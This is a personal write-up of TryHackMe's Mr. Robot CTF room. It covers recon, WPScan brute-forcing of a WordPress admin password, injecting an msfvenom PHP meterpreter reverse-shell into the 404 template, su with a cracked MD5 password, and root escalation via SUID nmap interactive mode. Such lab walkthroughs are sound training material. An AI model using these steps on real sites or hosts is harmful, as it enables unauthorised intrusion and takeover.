---
title: "Write-up: TryHackMe's Mr. Robot CTF"
published: 02/30/2020
authors:
  - Mauricio Schneider
---

This is a write-up for the TryHackMe's [Mr. Robot room](https://tryhackme.com/room/mrrobot).

## Reconnaissance  

### Happy Path

Going through an application as a user, in the way it was intended and designed, is generally known as [happy path](https://en.wikipedia.org/wiki/Happy_path). As I inspected the application, this is what I got. When visiting the IP of the machine in the browser, I was presented with this Mr. Robot inspired CLI-like prompt:

![Website Prompt](/blog-assets/write-up-tryhackmes-mr-robot-ctf/image-1.webp)

<table><tbody><tr><td colspan="1" rowspan="1"><p><strong>Command</strong></p></td><td colspan="1" rowspan="1"><p><strong>Description</strong></p></td></tr><tr><td colspan="1" rowspan="1"><p>prepare</p></td><td colspan="1" rowspan="1"><p>It displayed a video with a series of images from the show Mr. Robot</p></td></tr><tr><td colspan="1" rowspan="1"><p>fsociety</p></td><td colspan="1" rowspan="1"><p>It displayed a video from the show Mr. Robot with the question "Are you ready to join fsociety"</p></td></tr><tr><td colspan="1" rowspan="1"><p>inform</p></td><td colspan="1" rowspan="1"><p>It presented an image carousel with chat logs from a chat with Mr. Robot</p></td></tr><tr><td colspan="1" rowspan="1"><p>question</p></td><td colspan="1" rowspan="1"><p>Another image carousel with 3 pictures. The URL changed to http://IP/question</p></td></tr><tr><td colspan="1" rowspan="1"><p>wakeup</p></td><td colspan="1" rowspan="1"><p>It presented a video from the show Mr. Robot. It changed the URL to http://IP/wakeup</p></td></tr><tr><td colspan="1" rowspan="1"><p>join</p></td><td colspan="1" rowspan="1"><p>Simulates a chat with Mr. Robot, where you give your email address to apparently receive further instructions of how to join fsociety. I didn't receive any email. The URL changed to http://IP/join</p></td></tr></tbody></table>

After visiting a non-existent page by typing a random string in the URL, I got a 404 error page presented by a WordPress site.

By visiting the Log In link on the left sidebar, you are presented with the default WordPress admin login page.

### nmap

This is the output of running nmap on the IP:

```bash
$ nmap -p- -A -vv 10.10.159.39

Nmap scan report for 10.10.159.39
Host is up, received syn-ack (0.18s latency).
Scanned at 2020-08-09 09:39:30 PDT for 368s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT    STATE  SERVICE  REASON       VERSION
22/tcp  closed ssh      conn-refused
80/tcp  open   http     syn-ack      Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http syn-ack      Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:45
Completed NSE at 09:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:45
Completed NSE at 09:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:45
Completed NSE at 09:45, 0.00s elapsed
Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at  .
Nmap done: 1 IP address (1 host up) scanned in 368.55 seconds
```

Nmap identified that the machine was running an Apache server, although the version was not disclosed.

### robots.txt

The robots.txt file allows a web developer to specify what content search engines should crawl and index, and which content should be left alone. By visiting `http://IP/robots.txt`, I got the following:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

By going to `http://ip/key-1-of-3.txt`, we find the **first key**.

We can also download the fsocity.dic file hosted in the root of the site. The file contains a list of 858,160 words, one per line. I presume this will be useful for brute forcing or doing enumeration later on.

### sitemap.xml

No `sitemap.xml` was found in the root directory.

### Directory Enumeration

```bash
ffuf -w ~/tools/SecLists/Discovery/Web-Content/common.txt -u  -mc 200

        /'___\\  /'___\\           /'___\\
       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
          \\/_/    \\/_/   \\/___/    \\/_/

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : 
 :: Wordlist         : FUZZ: /Users/msch/Code/github.com/danielmiessler/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

0                       [Status: 200, Size: 8177, Words: 301, Lines: 124]
Image                   [Status: 200, Size: 11726, Words: 435, Lines: 155]
admin                   [Status: 200, Size: 1077, Words: 189, Lines: 31]
feed                    [Status: 200, Size: 807, Words: 12, Lines: 22]
image                   [Status: 200, Size: 11809, Words: 428, Lines: 155]
wp-content              [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-load                 [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-config               [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-cron                 [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-links-opml           [Status: 200, Size: 227, Words: 13, Lines: 11]
wp-login                [Status: 200, Size: 2664, Words: 115, Lines: 53]
:: Progress: [4658/4658] :: Job [1/1] :: 45 req/sec :: Duration: [0:01:43] :: Errors: 0 ::
```

### Wappalizer

From Wappalyzer results, and the comment in the response for `/wp-links-opml`, I learnt that the site was running WordPress 4.3.1. This led me to try running [WPscan](https://wpscan.org/) against the site.

One of the features that WPscan provides is brute force of admin credentials. As word list for brute forcing the admin page, I used the dictionary I found after inspecting `robots.txt`. For the username, I ended up getting a match with `elliot`, which is the name of the main character of the show Mr. Robot.

Before trying to brute force the admin login, I made sure that the dictionary was clean of duplicates. By executing the following command, the file went from 860k lines, to only 10. That obviously sped up the brute forcing process quite a lot.

```bash
sort fsocity.dic | uniq -u > fsociety-sorted-removed-dup.dic
```

Then, we run the following command:

```bash
wpscan --url  --passwords fsociety-sorted-removed-dup.dic --usernames elliot
```

The report I got back from WPscan looked like this:

```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.5
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.117.144/ [10.10.117.144]
[+] Started: Mon Aug 10 21:52:05 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.117.144/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.117.144/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] The external WP-Cron seems to be enabled: http://10.10.117.144/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.117.144/c607a28.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.117.144/c607a28.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.117.144/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-03-31T00:00:00.000Z
 | Readme: http://10.10.117.144/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://10.10.117.144/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.117.144/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <===================================================================================================================================> (21 / 21) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
Progress Time: 00:00:00 <========================================================================================================================================================> (0 / 0) 100.0% Time: 00:00:00
WARNING: Your progress bar is currently at 0 out of 0 and cannot be incremented. In v2.0.0 this will become a ProgressBar::InvalidProgressError.
Progress Time: 00:00:00 <========================================================================================================================================================> (0 / 0) 100.0% Time: 00:00:00
[SUCCESS] - elliot / ER28-0652
All Found

[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Mon Aug 10 21:52:16 2020
[+] Requests Done: 55
[+] Cached Requests: 6
[+] Data Sent: 16.171 KB
[+] Data Received: 235.956 KB
[+] Memory used: 195.172 MB
[+] Elapsed time: 00:00:11
```

Based on this, I discovered that Elliot's password is `ER28-0652`.

After trying out the credentials in the login page, I was finally in:

Once I confirmed I had valid admin credentials, a quick interwebs search led me to this page: [https://www.hackingarticles.in/wordpress-reverse-shell/](https://www.hackingarticles.in/wordpress-reverse-shell/). There, the author explains that you can modify the template used by the WP's 404 page to inject malicious PHP code that has the ability to open a reverse shell.

I used [msfvenom](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/) to create the payload that I needed to inject in the template file.

Now that I had identified the payload to use, I created the payload by using the following command:

## Exploitation

```bash
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=THM_VIRTUAL_IP LPORT=4444 -o shell.php -f raw

[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1112 bytes
Saved as: shell.php
```

I then customized the template by visiting `http://IP/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen`, and pasting the PHP code from shell.php into the template code. I made sure that the pasted code was not being commented out, and that there was a PHP closing tag at the end.

Before saving the changes, l made sure to have a [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) ready to receive the reverse shell:

```bash
$ msfconsole

msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST YOUR_VIRTUAL_IP
LHOST => 10.13.1.198
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on YOUR_VIRTUAL_IP:4444
```

With Meterpreter listening for the reverse shell, I went back to the browser where I was modifying the template, and finished the editing by clicking "Update File", at the bottom:

After visiting any non-existent URL, like `http://IP/asdfasd`, I noticed that the browser staid in a loading state, which is a good sign that a the reverse shell connection was being established. Once I went back to msfconsole, I confirmed that the session had been opened, and that I could start inspecting the filesystem of the host:

```bash
[*] Started reverse TCP handler on YOUR_VIRTUAL_IP:4444

[*] Sending stage (38288 bytes) to 10.10.117.144
[*] Meterpreter session 1 opened (YOUR_VIRTUAL_IP:4444 -> 10.10.117.144:50654) at 2020-08-10 22:36:13 -0700

meterpreter >
meterpreter > pwd
/opt/bitnami/apps/wordpress/htdocs
meterpreter > shell
Process 2356 created.
Channel 0 created.
whoami
daemon
cd /home
ls
robot
cd robot
ls
key-2-of-3.txt
password.raw-md5
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```

Here, I found the second key, but I didn't have the right permissions to read the file:

```bash
ls -al
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

I noticed that there was another file named `password.raw-md5`:

```bash
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Since I was feeling optimistic, I searched the web for the md5, and I found out that it's [been already cracked](https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b), with the respective non-hashed value being `abcdefghijklmnopqrstuvwxyz`. I thought it was fairly safe to assume this is the password for the user `robot`.

Since trying to run `su` directly threw an error saying that it needs to be run from inside a terminal, I used this Python snippet to initialize a terminal:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956[...]
```

And there's the second key!

Note: Another common script to get a terminal prompt is `/usr/bin/script -qc /bin/bash /dev/null`. However, in this instance, it didn't allow me to properly input the password.

Given the filename convention used so far, I decided to search for a file named `key-3-of-3.txt`. I was not able to find it under the user `robot`. Then, I searched for any processes that run as root, to find a way to escalate privileges:

```bash
find / -perm +6000 2>/dev/null | grep '/bin/'
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap
```

After searching for potential privilege escalations using any of these binaries, I found out that it's well documented that running nmap in interactive mode is particularly useful for this purpose:

```bash
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 (  )
Welcome to Interactive Mode -- press h  for help
nmap> ls /root
ls /root
Unknown command (ls) -- press h  for help
nmap> !sh
!sh
# ls /root
ls /root
firstboot_done  key-3-of-3.txt
# cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27[...]
```

And there you go! With that, I completed the CTF.